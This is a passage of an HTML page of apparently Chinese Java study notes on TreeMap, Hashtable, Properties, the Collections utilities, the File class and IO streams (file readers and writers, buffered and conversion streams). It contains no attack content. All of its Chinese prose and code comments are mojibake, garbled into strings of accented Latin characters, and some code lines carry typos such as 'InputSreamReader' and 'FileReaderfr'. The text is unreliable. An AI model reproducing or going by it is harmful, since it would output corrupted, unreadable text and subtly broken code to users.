<li><strong>è‡ªç„¶æ’åº</strong>ï¼šTreeMapçš„æ‰€æœ‰çš„Key å¿…é¡»å®ç°Comparable æ¥å£ï¼Œè€Œä¸”æ‰€æœ‰çš„Key åº”è¯¥æ˜¯åŒä¸€ä¸ªç±»çš„å¯¹è±¡ï¼Œå¦åˆ™å°†ä¼šæŠ›å‡ºClasssCastException</li>
<li><strong>å®šåˆ¶æ’åº</strong>ï¼šåˆ›å»ºTreeMapæ—¶ï¼Œä¼ å…¥ä¸€ä¸ªComparator å¯¹è±¡ï¼Œè¯¥å¯¹è±¡è´Ÿè´£å¯¹TreeMapä¸­çš„æ‰€æœ‰key è¿›è¡Œæ’åºã€‚æ­¤æ—¶ä¸éœ€è¦Map çš„Key å®ç°Comparable æ¥å£</li>
</ul>
</li>
<li>TreeMapåˆ¤æ–­<strong>ä¸¤ä¸ªkeyç›¸ç­‰</strong>çš„æ ‡å‡†ï¼šä¸¤ä¸ªkeyé€šè¿‡compareTo()æ–¹æ³•æˆ–è€…compare()æ–¹æ³•è¿”å›0ã€‚</li>
</ul>
<h4 id="Hashtable"><a href="#Hashtable" class="headerlink" title="Hashtable"></a>Hashtable</h4><ul>
<li>Hashtableæ˜¯ä¸ªå¤è€çš„Map å®ç°ç±»ï¼ŒJDK1.0å°±æä¾›äº†ã€‚ä¸åŒäºHashMapï¼ŒHashtableæ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚</li>
<li>Hashtableå®ç°åŸç†å’ŒHashMapç›¸åŒï¼ŒåŠŸèƒ½ç›¸åŒã€‚åº•å±‚éƒ½ä½¿ç”¨å“ˆå¸Œè¡¨ç»“æ„ï¼ŒæŸ¥è¯¢é€Ÿåº¦å¿«ï¼Œå¾ˆå¤šæƒ…å†µä¸‹å¯ä»¥äº’ç”¨ã€‚</li>
<li>ä¸HashMapä¸åŒï¼ŒHashtableä¸å…è®¸ä½¿ç”¨null ä½œä¸ºkey å’Œvalue</li>
<li>ä¸HashMapä¸€æ ·ï¼ŒHashtableä¹Ÿä¸èƒ½ä¿è¯å…¶ä¸­Key-Value å¯¹çš„é¡ºåº</li>
<li>Hashtableåˆ¤æ–­ä¸¤ä¸ªkeyç›¸ç­‰ã€ä¸¤ä¸ªvalueç›¸ç­‰çš„æ ‡å‡†ï¼Œä¸HashMapä¸€è‡´ã€‚</li>
</ul>
<h4 id="Propertieså¤„ç†å±æ€§æ–‡ä»¶"><a href="#Propertieså¤„ç†å±æ€§æ–‡ä»¶" class="headerlink" title="Propertieså¤„ç†å±æ€§æ–‡ä»¶"></a>Propertieså¤„ç†å±æ€§æ–‡ä»¶</h4><ul>
<li>Properties ç±»æ˜¯Hashtableçš„å­ç±»ï¼Œè¯¥å¯¹è±¡ç”¨äºå¤„ç†å±æ€§æ–‡ä»¶</li>
<li>ç”±äºå±æ€§æ–‡ä»¶é‡Œçš„keyã€value éƒ½æ˜¯å­—ç¬¦ä¸²ç±»å‹ï¼Œæ‰€ä»¥<strong>Properties é‡Œçš„key å’Œvalue éƒ½æ˜¯å­—ç¬¦ä¸²ç±»å‹</strong></li>
<li>å­˜å–æ•°æ®æ—¶ï¼Œå»ºè®®ä½¿ç”¨setProperty(String key,Stringvalue)æ–¹æ³•å’ŒgetProperty(String key)æ–¹æ³•</li>
</ul>
<h3 id="7ã€Collectionså·¥å…·ç±»"><a href="#7ã€Collectionså·¥å…·ç±»" class="headerlink" title="7ã€Collectionså·¥å…·ç±»"></a>7ã€Collectionså·¥å…·ç±»</h3><ul>
<li><p>æ“ä½œæ•°ç»„çš„å·¥å…·ç±»ï¼šArrays</p>
</li>
<li><p>Collections æ˜¯ä¸€ä¸ªæ“ä½œSetã€Listå’ŒMap ç­‰é›†åˆçš„å·¥å…·ç±»</p>
</li>
<li><p>Collections ä¸­æä¾›äº†ä¸€ç³»åˆ—é™æ€çš„æ–¹æ³•å¯¹é›†åˆå…ƒç´ è¿›è¡Œæ’åºã€æŸ¥è¯¢å’Œä¿®æ”¹ç­‰æ“ä½œï¼Œè¿˜æä¾›äº†å¯¹é›†åˆå¯¹è±¡è®¾ç½®ä¸å¯å˜ã€å¯¹é›†åˆå¯¹è±¡å®ç°åŒæ­¥æ§åˆ¶ç­‰æ–¹æ³•</p>
</li>
<li><p>æ’åºæ“ä½œï¼šï¼ˆå‡ä¸ºstaticæ–¹æ³•ï¼‰</p>
<ul>
<li>reverse(List)ï¼šåè½¬List ä¸­å…ƒç´ çš„é¡ºåº</li>
<li>shuffle(List)ï¼šå¯¹Listé›†åˆå…ƒç´ è¿›è¡Œéšæœºæ’åº</li>
<li>sort(List)ï¼šæ ¹æ®å…ƒç´ çš„è‡ªç„¶é¡ºåºå¯¹æŒ‡å®šList é›†åˆå…ƒç´ æŒ‰å‡åºæ’åº</li>
<li>sort(Listï¼ŒComparator)ï¼šæ ¹æ®æŒ‡å®šçš„Comparator äº§ç”Ÿçš„é¡ºåºå¯¹List é›†åˆå…ƒç´ è¿›è¡Œæ’åº</li>
<li>swap(Listï¼Œintï¼Œint)ï¼šå°†æŒ‡å®šlist é›†åˆä¸­çš„iå¤„å…ƒç´ å’Œj å¤„å…ƒç´ è¿›è¡Œäº¤æ¢</li>
</ul>
</li>
</ul>
<h2 id="IO"><a href="#IO" class="headerlink" title="IO"></a>IO</h2><h3 id="1ã€Fileç±»çš„ä½¿ç”¨"><a href="#1ã€Fileç±»çš„ä½¿ç”¨" class="headerlink" title="1ã€Fileç±»çš„ä½¿ç”¨"></a>1ã€Fileç±»çš„ä½¿ç”¨</h3><h4 id="Fileç±»çš„å®ä¾‹åŒ–"><a href="#Fileç±»çš„å®ä¾‹åŒ–" class="headerlink" title="Fileç±»çš„å®ä¾‹åŒ–"></a>Fileç±»çš„å®ä¾‹åŒ–</h4><ul>
<li>java.io.Fileç±»ï¼šæ–‡ä»¶å’Œæ–‡ä»¶ç›®å½•è·¯å¾„çš„æŠ½è±¡è¡¨ç¤ºå½¢å¼ï¼Œä¸å¹³å°æ— å…³</li>
<li>File èƒ½æ–°å»ºã€åˆ é™¤ã€é‡å‘½åæ–‡ä»¶å’Œç›®å½•ï¼Œä½†File ä¸èƒ½è®¿é—®æ–‡ä»¶å†…å®¹æœ¬èº«ã€‚å¦‚æœéœ€è¦è®¿é—®æ–‡ä»¶å†…å®¹æœ¬èº«ï¼Œåˆ™éœ€è¦ä½¿ç”¨è¾“å…¥&#x2F;è¾“å‡ºæµã€‚</li>
<li>æƒ³è¦åœ¨Javaç¨‹åºä¸­è¡¨ç¤ºä¸€ä¸ªçœŸå®å­˜åœ¨çš„æ–‡ä»¶æˆ–ç›®å½•ï¼Œé‚£ä¹ˆå¿…é¡»æœ‰ä¸€ä¸ªFileå¯¹è±¡ï¼Œä½†æ˜¯Javaç¨‹åºä¸­çš„ä¸€ä¸ªFileå¯¹è±¡ï¼Œå¯èƒ½æ²¡æœ‰ä¸€ä¸ªçœŸå®å­˜åœ¨çš„æ–‡ä»¶æˆ–ç›®å½•ã€‚</li>
<li>Fileå¯¹è±¡å¯ä»¥ä½œä¸ºå‚æ•°ä¼ é€’ç»™æµçš„æ„é€ å™¨</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 1.å¦‚ä½•åˆ›å»ºfileç±»çš„å®ä¾‹</span></span><br><span class="line"><span class="comment">     *      File(String filePath):ä»¥filePathä¸ºè·¯å¾„åˆ›å»ºFileå¯¹è±¡ï¼Œå¯ä»¥æ˜¯ç»å¯¹è·¯å¾„æˆ–è€…ç›¸å¯¹è·¯å¾„</span></span><br><span class="line"><span class="comment">     *      File(String parentPath,String childPath):ä»¥parentPathä¸ºçˆ¶è·¯å¾„ï¼ŒchildPathä¸ºå­è·¯å¾„åˆ›å»ºFileå¯¹è±¡ã€‚</span></span><br><span class="line"><span class="comment">     *      File(File parentFile,String childPath):æ ¹æ®ä¸€ä¸ªçˆ¶Fileå¯¹è±¡å’Œå­æ–‡ä»¶è·¯å¾„åˆ›å»ºFileå¯¹è±¡</span></span><br><span class="line"><span class="comment">     * 2.</span></span><br><span class="line"><span class="comment">     *   ç›¸å¯¹è·¯å¾„ï¼šç›¸è¾ƒäºæŸä¸ªè·¯å¾„ä¸‹ï¼ŒæŒ‡æ˜çš„è·¯å¾„ã€‚</span></span><br><span class="line"><span class="comment">     *   ç»å¯¹è·¯å¾„ï¼šåŒ…å«ç›˜ç¬¦åœ¨å†…çš„æ–‡ä»¶æˆ–æ–‡ä»¶ç›®å½•çš„è·¯å¾„</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 3.è·¯å¾„åˆ†éš”ç¬¦</span></span><br><span class="line"><span class="comment">     *      windows:\\</span></span><br><span class="line"><span class="comment">     *      unix:/</span></span><br><span class="line"><span class="comment">     * 4.Javaç¨‹åºæ”¯æŒè·¨å¹³å°è¿è¡Œï¼Œå› æ­¤è·¯å¾„åˆ†éš”ç¬¦è¦æ…ç”¨ã€‚</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 5.ä¸ºäº†è§£å†³è¿™ä¸ªéšæ‚£ï¼ŒFileç±»æä¾›äº†ä¸€ä¸ªå¸¸é‡ï¼š</span></span><br><span class="line"><span class="comment">     *   public  static final String separatorã€‚</span></span><br><span class="line"><span class="comment">     *   æ ¹æ®æ“ä½œç³»ç»Ÿï¼ŒåŠ¨æ€çš„æä¾›åˆ†éš”ç¬¦ã€‚</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * File file1= new File(&quot;d:\\Work\\info.txt&quot;);</span></span><br><span class="line"><span class="comment">     * File file2= new File(&quot;d:&quot;+ File.separator+ &quot;Work&quot;+ File.separator+ &quot;info.txt&quot;);</span></span><br><span class="line"><span class="comment">     * File file3= new File(&quot;d:/Work&quot;);</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br></pre></td></tr></table></figure>

<h4 id="Fileç±»çš„å¸¸ç”¨æ–¹æ³•"><a href="#Fileç±»çš„å¸¸ç”¨æ–¹æ³•" class="headerlink" title="Fileç±»çš„å¸¸ç”¨æ–¹æ³•"></a>Fileç±»çš„å¸¸ç”¨æ–¹æ³•</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * public String getAbsolutePath()ï¼šè·å–ç»å¯¹è·¯å¾„</span></span><br><span class="line"><span class="comment">     * public String getPath() ï¼šè·å–è·¯å¾„</span></span><br><span class="line"><span class="comment">     * public String getName() ï¼šè·å–åç§°</span></span><br><span class="line"><span class="comment">     * public String getParent()ï¼šè·å–ä¸Šå±‚æ–‡ä»¶ç›®å½•è·¯å¾„ã€‚è‹¥æ— ï¼Œè¿”å›null</span></span><br><span class="line"><span class="comment">     * public long length() ï¼šè·å–æ–‡ä»¶é•¿åº¦ï¼ˆå³ï¼šå­—èŠ‚æ•°ï¼‰ã€‚ä¸èƒ½è·å–ç›®å½•çš„é•¿åº¦ã€‚</span></span><br><span class="line"><span class="comment">     * public long lastModified() ï¼šè·å–æœ€åä¸€æ¬¡çš„ä¿®æ”¹æ—¶é—´ï¼Œæ¯«ç§’å€¼</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * å¦‚ä¸‹çš„ä¸¤ä¸ªæ–¹æ³•é€‚ç”¨äºæ–‡ä»¶ç›®å½•ï¼š</span></span><br><span class="line"><span class="comment">     * public String[] list() ï¼šè·å–æŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶æˆ–è€…æ–‡ä»¶ç›®å½•çš„åç§°æ•°ç»„</span></span><br><span class="line"><span class="comment">     * public File[] listFiles() ï¼šè·å–æŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶æˆ–è€…æ–‡ä»¶ç›®å½•çš„Fileæ•°ç»„</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Fileç±»çš„é‡å‘½ååŠŸèƒ½</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *  public boolean renameTo(File dest):æŠŠæ–‡ä»¶é‡å‘½åä¸ºæŒ‡å®šçš„æ–‡ä»¶è·¯å¾„</span></span><br><span class="line"><span class="comment">     *    æ¯”å¦‚ï¼šfile1.renameTo(file2)ä¸ºä¾‹ï¼š</span></span><br><span class="line"><span class="comment">     *         è¦æƒ³ä¿è¯è¿”å›true,éœ€è¦file1åœ¨ç¡¬ç›˜ä¸­æ˜¯å­˜åœ¨çš„ï¼Œä¸”file2ä¸èƒ½åœ¨ç¡¬ç›˜ä¸­å­˜åœ¨ã€‚</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * public boolean isDirectory()ï¼šåˆ¤æ–­æ˜¯å¦æ˜¯æ–‡ä»¶ç›®å½•</span></span><br><span class="line"><span class="comment">     * public boolean isFile() ï¼šåˆ¤æ–­æ˜¯å¦æ˜¯æ–‡ä»¶</span></span><br><span class="line"><span class="comment">     * public boolean exists() ï¼šåˆ¤æ–­æ˜¯å¦å­˜åœ¨</span></span><br><span class="line"><span class="comment">     * public boolean canRead() ï¼šåˆ¤æ–­æ˜¯å¦å¯è¯»</span></span><br><span class="line"><span class="comment">     * public boolean canWrite() ï¼šåˆ¤æ–­æ˜¯å¦å¯å†™</span></span><br><span class="line"><span class="comment">     * public boolean isHidden() ï¼šåˆ¤æ–­æ˜¯å¦éšè—</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * åˆ›å»ºç¡¬ç›˜ä¸­å¯¹åº”çš„æ–‡ä»¶æˆ–æ–‡ä»¶ç›®å½•</span></span><br><span class="line"><span class="comment">     * public boolean createNewFile() ï¼šåˆ›å»ºæ–‡ä»¶ã€‚è‹¥æ–‡ä»¶å­˜åœ¨ï¼Œåˆ™ä¸åˆ›å»ºï¼Œè¿”å›false</span></span><br><span class="line"><span class="comment">     * public boolean mkdir() ï¼šåˆ›å»ºæ–‡ä»¶ç›®å½•ã€‚å¦‚æœæ­¤æ–‡ä»¶ç›®å½•å­˜åœ¨ï¼Œå°±ä¸åˆ›å»ºäº†ã€‚å¦‚æœæ­¤æ–‡ä»¶ç›®å½•çš„ä¸Šå±‚ç›®å½•ä¸å­˜åœ¨ï¼Œä¹Ÿä¸åˆ›å»ºã€‚</span></span><br><span class="line"><span class="comment">     * public boolean mkdirs() ï¼šåˆ›å»ºæ–‡ä»¶ç›®å½•ã€‚å¦‚æœæ­¤æ–‡ä»¶ç›®å½•å­˜åœ¨ï¼Œå°±ä¸åˆ›å»ºäº†ã€‚å¦‚æœä¸Šå±‚æ–‡ä»¶ç›®å½•ä¸å­˜åœ¨ï¼Œä¸€å¹¶åˆ›å»º</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *     åˆ é™¤ç£ç›˜ä¸­çš„æ–‡ä»¶æˆ–æ–‡ä»¶ç›®å½•</span></span><br><span class="line"><span class="comment">     * public boolean delete()ï¼šåˆ é™¤æ–‡ä»¶æˆ–è€…æ–‡ä»¶å¤¹</span></span><br><span class="line"><span class="comment">     *     åˆ é™¤æ³¨æ„äº‹é¡¹ï¼šJavaä¸­çš„åˆ é™¤ä¸èµ°å›æ”¶ç«™ã€‚</span></span><br><span class="line"><span class="comment">     */</span></span><br></pre></td></tr></table></figure>

<h3 id="2-IOæµåŸç†åŠæµçš„åˆ†ç±»"><a href="#2-IOæµåŸç†åŠæµçš„åˆ†ç±»" class="headerlink" title="2.IOæµåŸç†åŠæµçš„åˆ†ç±»"></a>2.IOæµåŸç†åŠæµçš„åˆ†ç±»</h3><h4 id="IOæµåŸç†"><a href="#IOæµåŸç†" class="headerlink" title="IOæµåŸç†"></a>IOæµåŸç†</h4><ul>
<li>I&#x2F;Oæ˜¯Input&#x2F;Outputçš„ç¼©å†™ï¼ŒI&#x2F;OæŠ€æœ¯æ˜¯éå¸¸å®ç”¨çš„æŠ€æœ¯ï¼Œç”¨äºå¤„ç†è®¾å¤‡ä¹‹é—´çš„æ•°æ®ä¼ è¾“ã€‚å¦‚è¯»&#x2F;å†™æ–‡ä»¶ï¼Œç½‘ç»œé€šè®¯ç­‰ã€‚</li>
<li>Javaç¨‹åºä¸­ï¼Œå¯¹äºæ•°æ®çš„è¾“å…¥&#x2F;è¾“å‡ºæ“ä½œä»¥â€œæµ(stream)â€çš„æ–¹å¼è¿›è¡Œã€‚</li>
<li>java.ioåŒ…ä¸‹æä¾›äº†å„ç§â€œæµâ€ç±»å’Œæ¥å£ï¼Œç”¨ä»¥è·å–ä¸åŒç§ç±»çš„æ•°æ®ï¼Œå¹¶é€šè¿‡æ ‡å‡†çš„æ–¹æ³•è¾“å…¥æˆ–è¾“å‡ºæ•°æ®ã€‚</li>
<li>è¾“å…¥inputï¼šè¯»å–å¤–éƒ¨æ•°æ®ï¼ˆç£ç›˜ã€å…‰ç›˜ç­‰å­˜å‚¨è®¾å¤‡çš„æ•°æ®ï¼‰åˆ°ç¨‹åºï¼ˆå†…å­˜ï¼‰ä¸­ã€‚</li>
<li>è¾“å‡ºoutputï¼šå°†ç¨‹åºï¼ˆå†…å­˜ï¼‰æ•°æ®è¾“å‡ºåˆ°ç£ç›˜ã€å…‰ç›˜ç­‰å­˜å‚¨è®¾å¤‡ä¸­ã€‚</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/0332c07d4172fd418c663af3cf0e62c9--dd7c--image-20241002172628012.png" alt="image-20241002172628012"></p>
<h4 id="æµçš„åˆ†ç±»"><a href="#æµçš„åˆ†ç±»" class="headerlink" title="æµçš„åˆ†ç±»"></a>æµçš„åˆ†ç±»</h4><ul>
<li>æŒ‰æ“ä½œ<strong>æ•°æ®å•ä½</strong>ä¸åŒåˆ†ä¸ºï¼šå­—èŠ‚æµ(8 bit)ï¼Œå­—ç¬¦æµ(16 bit)</li>
<li>æŒ‰æ•°æ®æµçš„<strong>æµå‘</strong>ä¸åŒåˆ†ä¸ºï¼šè¾“å…¥æµï¼Œè¾“å‡ºæµ</li>
<li>æŒ‰æµçš„<strong>è§’è‰²</strong>çš„ä¸åŒåˆ†ä¸ºï¼šèŠ‚ç‚¹æµï¼Œå¤„ç†æµ</li>
</ul>
<table>
<thead>
<tr>
<th align="center">æŠ½è±¡åŸºç±»</th>
<th align="center">å­—èŠ‚æµ</th>
<th align="center">å­—ç¬¦æµ</th>
</tr>
</thead>
<tbody><tr>
<td align="center">è¾“å…¥æµ</td>
<td align="center">InputStream</td>
<td align="center">Reader</td>
</tr>
<tr>
<td align="center">è¾“å‡ºæµ</td>
<td align="center">OutputStream</td>
<td align="center">Writer</td>
</tr>
</tbody></table>
<ol>
<li><p>Javaçš„IOæµå…±æ¶‰åŠ40å¤šä¸ªç±»ï¼Œå®é™…ä¸Šéå¸¸è§„åˆ™ï¼Œéƒ½æ˜¯ä»å¦‚ä¸‹4ä¸ªæŠ½è±¡åŸºç±»æ´¾ç”Ÿçš„ã€‚</p>
</li>
<li><p>ç”±è¿™å››ä¸ªç±»æ´¾ç”Ÿå‡ºæ¥çš„å­ç±»åç§°éƒ½æ˜¯ä»¥å…¶çˆ¶ç±»åä½œä¸ºå­ç±»ååç¼€ã€‚</p>
</li>
</ol>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/4fcecdfdeb30135c60b9f69d33e65dc4--7e07--image-20241002173511265.png" alt="image-20241002173511265"></p>
<h4 id="IO-æµä½“ç³»"><a href="#IO-æµä½“ç³»" class="headerlink" title="IO æµä½“ç³»"></a>IO æµä½“ç³»</h4><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/548e94ddbf27a53c4ea5dc103380530a--eba7--image-20241002173536636.png" alt="image-20241002173536636"></p>
<h3 id="3-èŠ‚ç‚¹æµ-æˆ–æ–‡ä»¶æµ"><a href="#3-èŠ‚ç‚¹æµ-æˆ–æ–‡ä»¶æµ" class="headerlink" title="3.èŠ‚ç‚¹æµ(æˆ–æ–‡ä»¶æµ)"></a>3.èŠ‚ç‚¹æµ(æˆ–æ–‡ä»¶æµ)</h3><h4 id="FileReaderè¯»å…¥æ•°æ®çš„åŸºæœ¬æ“ä½œ"><a href="#FileReaderè¯»å…¥æ•°æ®çš„åŸºæœ¬æ“ä½œ" class="headerlink" title="FileReaderè¯»å…¥æ•°æ®çš„åŸºæœ¬æ“ä½œ"></a>FileReaderè¯»å…¥æ•°æ®çš„åŸºæœ¬æ“ä½œ</h4><ul>
<li>è¯»å–æ–‡ä»¶</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>å»ºç«‹ä¸€ä¸ªæµå¯¹è±¡ï¼Œå°†å·²å­˜åœ¨çš„ä¸€ä¸ªæ–‡ä»¶åŠ è½½è¿›æµã€‚		</span><br><span class="line">	FileReaderfr= <span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="keyword">new</span> <span class="title class_">File</span>(â€œTest.txtâ€));</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>åˆ›å»ºä¸€ä¸ªä¸´æ—¶å­˜æ”¾æ•°æ®çš„æ•°ç»„ã€‚</span><br><span class="line">	<span class="type">char</span>[] ch= <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>è°ƒç”¨æµå¯¹è±¡çš„è¯»å–æ–¹æ³•å°†æµä¸­çš„æ•°æ®è¯»å…¥åˆ°æ•°ç»„ä¸­ã€‚		</span><br><span class="line">	fr.read(ch);</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> å…³é—­èµ„æºã€‚</span><br><span class="line">	fr.close();</span><br></pre></td></tr></table></figure>

<h4 id="FileWriterå†™å‡ºæ•°æ®çš„æ“ä½œ"><a href="#FileWriterå†™å‡ºæ•°æ®çš„æ“ä½œ" class="headerlink" title="FileWriterå†™å‡ºæ•°æ®çš„æ“ä½œ"></a>FileWriterå†™å‡ºæ•°æ®çš„æ“ä½œ</h4><ul>
<li>å†™å…¥æ–‡ä»¶</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>åˆ›å»ºæµå¯¹è±¡ï¼Œå»ºç«‹æ•°æ®å­˜æ”¾æ–‡ä»¶</span><br><span class="line">    FileWriterfw= <span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="keyword">new</span> <span class="title class_">File</span>(â€œTest.txtâ€));</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>è°ƒç”¨æµå¯¹è±¡çš„å†™å…¥æ–¹æ³•ï¼Œå°†æ•°æ®å†™å…¥æµ</span><br><span class="line">    fw.write(â€œatguigu-songhongkangâ€);</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>å…³é—­æµèµ„æºï¼Œå¹¶å°†æµä¸­çš„æ•°æ®æ¸…ç©ºåˆ°æ–‡ä»¶ä¸­ã€‚</span><br><span class="line">    fw.close();</span><br></pre></td></tr></table></figure>

<h3 id="4-ç¼“å†²æµ"><a href="#4-ç¼“å†²æµ" class="headerlink" title="4.ç¼“å†²æµ"></a>4.ç¼“å†²æµ</h3><ul>
<li>ä¸ºäº†æé«˜æ•°æ®è¯»å†™çš„é€Ÿåº¦ï¼ŒJava APIæä¾›äº†å¸¦ç¼“å†²åŠŸèƒ½çš„æµç±»ï¼Œåœ¨ä½¿ç”¨è¿™äº›æµç±»æ—¶ï¼Œä¼šåˆ›å»ºä¸€ä¸ªå†…éƒ¨ç¼“å†²åŒºæ•°ç»„ï¼Œç¼ºçœä½¿ç”¨8192ä¸ªå­—èŠ‚(8Kb)çš„ç¼“å†²åŒºã€‚</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/e15a777941671c4cb10540b0dbdd135a--083a--image-20241002183552837.png" alt="image-20241002183552837"></p>
<ul>
<li><p>ç¼“å†²æµè¦â€œå¥—æ¥â€åœ¨ç›¸åº”çš„èŠ‚ç‚¹æµä¹‹ä¸Šï¼Œæ ¹æ®æ•°æ®æ“ä½œå•ä½å¯ä»¥æŠŠç¼“å†²æµåˆ†ä¸ºï¼š</p>
<ul>
<li>BufferedInputStreamå’ŒBufferedOutputStream</li>
<li>BufferedReaderå’ŒBufferedWriter</li>
</ul>
</li>
<li><p>å½“è¯»å–æ•°æ®æ—¶ï¼Œæ•°æ®æŒ‰å—è¯»å…¥ç¼“å†²åŒºï¼Œå…¶åçš„è¯»æ“ä½œåˆ™ç›´æ¥è®¿é—®ç¼“å†²åŒº</p>
</li>
<li><p>å½“ä½¿ç”¨BufferedInputStreamè¯»å–å­—èŠ‚æ–‡ä»¶æ—¶ï¼ŒBufferedInputStreamä¼šä¸€æ¬¡æ€§ä»æ–‡ä»¶ä¸­è¯»å–8192ä¸ª(8Kb)ï¼Œå­˜åœ¨ç¼“å†²åŒºä¸­ï¼Œç›´åˆ°ç¼“å†²åŒºè£…æ»¡äº†ï¼Œæ‰é‡æ–°ä»æ–‡ä»¶ä¸­è¯»å–ä¸‹ä¸€ä¸ª8192ä¸ªå­—èŠ‚æ•°ç»„ã€‚</p>
</li>
<li><p>å‘æµä¸­å†™å…¥å­—èŠ‚æ—¶ï¼Œä¸ä¼šç›´æ¥å†™åˆ°æ–‡ä»¶ï¼Œå…ˆå†™åˆ°ç¼“å†²åŒºä¸­ç›´åˆ°ç¼“å†²åŒºå†™æ»¡ï¼ŒBufferedOutputStreamæ‰ä¼šæŠŠç¼“å†²åŒºä¸­çš„æ•°æ®ä¸€æ¬¡æ€§å†™åˆ°æ–‡ä»¶é‡Œã€‚ä½¿ç”¨æ–¹æ³•flush()å¯ä»¥å¼ºåˆ¶å°†ç¼“å†²åŒºçš„å†…å®¹å…¨éƒ¨å†™å…¥è¾“å‡ºæµ</p>
</li>
<li><p>å…³é—­æµçš„é¡ºåºå’Œæ‰“å¼€æµçš„é¡ºåºç›¸åã€‚åªè¦å…³é—­æœ€å¤–å±‚æµå³å¯ï¼Œå…³é—­æœ€å¤–å±‚æµä¹Ÿä¼šç›¸åº”å…³é—­å†…å±‚èŠ‚ç‚¹æµ</p>
</li>
<li><p>flush()æ–¹æ³•çš„ä½¿ç”¨ï¼šæ‰‹åŠ¨å°†bufferä¸­å†…å®¹å†™å…¥æ–‡ä»¶</p>
</li>
<li><p>å¦‚æœæ˜¯å¸¦ç¼“å†²åŒºçš„æµå¯¹è±¡çš„close()æ–¹æ³•ï¼Œä¸ä½†ä¼šå…³é—­æµï¼Œè¿˜ä¼šåœ¨å…³é—­æµä¹‹å‰åˆ·æ–°ç¼“å†²åŒºï¼Œå…³é—­åä¸èƒ½å†å†™å‡ºã€‚</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/b3b7754d04c3b7f5e3aac395d953838d--d9d6--image-20241002183634220.png" alt="image-20241002183634220"></p>
<h3 id="5-è½¬æ¢æµ"><a href="#5-è½¬æ¢æµ" class="headerlink" title="5.è½¬æ¢æµ"></a>5.è½¬æ¢æµ</h3><h4 id="è½¬æ¢æµæ¦‚è¿°ä¸InputStreamReaderçš„ä½¿ç”¨"><a href="#è½¬æ¢æµæ¦‚è¿°ä¸InputStreamReaderçš„ä½¿ç”¨" class="headerlink" title="è½¬æ¢æµæ¦‚è¿°ä¸InputStreamReaderçš„ä½¿ç”¨"></a>è½¬æ¢æµæ¦‚è¿°ä¸InputStreamReaderçš„ä½¿ç”¨</h4><ul>
<li><p>è½¬æ¢æµæä¾›äº†åœ¨å­—èŠ‚æµå’Œå­—ç¬¦æµä¹‹é—´çš„è½¬æ¢</p>
</li>
<li><p>Java APIæä¾›äº†ä¸¤ä¸ªè½¬æ¢æµï¼š</p>
<ul>
<li>InputStreamReaderï¼šå°†InputStreamè½¬æ¢ä¸ºReader<ul>
<li>å®ç°å°†å­—èŠ‚çš„è¾“å…¥æµæŒ‰æŒ‡å®šå­—ç¬¦é›†è½¬æ¢ä¸ºå­—ç¬¦çš„è¾“å…¥æµã€‚</li>
<li>éœ€è¦å’ŒInputStreamâ€œå¥—æ¥â€ã€‚</li>
<li>æ„é€ å™¨<ul>
<li>public InputStreamReader(InputStreamin)</li>
<li>public InputSreamReader(InputStreamin,StringcharsetName)</li>
<li>å¦‚ï¼šReader isr&#x3D; new InputStreamReader(System.in,â€gbkâ€);</li>
</ul>
</li>
</ul>
</li>
<li>OutputStreamWriterï¼šå°†Writerè½¬æ¢ä¸ºOutputStream<ul>
<li>å®ç°å°†å­—ç¬¦çš„è¾“å‡ºæµæŒ‰æŒ‡å®šå­—ç¬¦é›†è½¬æ¢ä¸ºå­—èŠ‚çš„è¾“å‡ºæµã€‚</li>
<li>éœ€è¦å’ŒOutputStreamâ€œå¥—æ¥â€ã€‚</li>
<li>æ„é€ å™¨<ul>
<li>public OutputStreamWriter(OutputStreamout)</li>
<li>public OutputSreamWriter(OutputStreamout,StringcharsetName)</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>å­—èŠ‚æµä¸­çš„æ•°æ®éƒ½æ˜¯å­—ç¬¦æ—¶ï¼Œè½¬æˆå­—ç¬¦æµæ“ä½œæ›´é«˜æ•ˆã€‚</p>
</li>
